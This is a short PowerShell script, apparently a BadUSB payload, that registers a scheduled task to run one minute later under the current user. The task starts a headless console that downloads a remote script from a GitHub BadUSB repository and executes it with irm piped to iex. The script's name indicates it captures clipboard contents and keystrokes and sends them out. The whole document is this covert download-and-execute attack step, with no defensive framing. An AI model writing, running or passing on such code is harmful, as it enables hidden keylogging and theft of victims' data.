$taskAction = New-ScheduledTaskAction -Execute "conhost.exe" -Argument " --headless powershell -C  irm https://raw.githubusercontent.com/JoshuaBrien/BadUSB/refs/heads/main/Windows%2011/commands/capture_clipboard%2Bkey_send15s.ps1 | iex"
$taskTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries
$taskRunAs = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME"
$scheduledTask = New-ScheduledTask -Action $taskAction -Trigger $taskTrigger -Principal $taskRunAs -Settings $settings 
Register-ScheduledTask -TaskName "Raven_conhost_SCtask" -InputObject $scheduledTask -Force

